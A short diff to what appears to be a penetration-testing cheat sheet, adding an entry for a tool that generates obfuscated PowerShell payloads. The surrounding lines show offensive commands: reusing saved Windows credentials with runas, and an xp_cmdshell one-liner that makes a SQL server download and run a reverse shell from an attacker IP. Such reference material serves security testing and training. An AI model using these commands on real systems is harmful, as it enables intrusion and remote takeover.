@@ -756,6 +756,7 @@ $ script -qc /bin/bash /dev/null
 - [**Seatbelt**](https://github.com/GhostPack/Seatbelt)**:** Similar to the previous one but only with Windows. [Here](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) you can download the already compiled .exe
 	- If Seatbelt finds that an account has the credentials saved in windows Credential Manager we can run commands like that account as follows: `runas /savecred /user:<usario> /profile "cmd.exe"`
 - [**John the Ripper**](https://github.com/openwall/john)**:** Allows you to crack a lot of password types.
+- [**Invoke-CradleCrafter**](https://github.com/danielbohannon/Invoke-CradleCrafter)**:** Allow you to generate obfuscated payloads to be executed in Powershell
 - **ReverShell from server SQL:**
 	- With this command: `xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");"` you can execute
 the reverse shell we have on the computer from vulnerable SQL server. 
